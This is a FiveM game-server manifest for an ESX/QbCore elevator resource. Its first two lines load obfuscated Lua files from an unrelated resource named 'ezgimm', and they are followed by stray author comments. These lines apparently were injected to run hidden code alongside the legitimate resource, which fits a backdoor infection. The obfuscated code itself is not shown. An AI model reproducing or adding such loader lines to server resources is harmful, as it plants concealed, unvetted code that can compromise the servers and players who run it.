shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA
 
fx_version 'cerulean'
game 'gta5'
lua54 'yes'

description "Wasabi's ESX/QbCore Elevator"

author 'wasabirobby#5110'

version '1.0.2'

client_scripts {
	'client/*.lua',
}

server_scripts {
	'server/*.lua'
}

shared_scripts {
	'@ox_lib/init.lua',
	'config.lua'
}

dependencies {
	'ox_lib'
}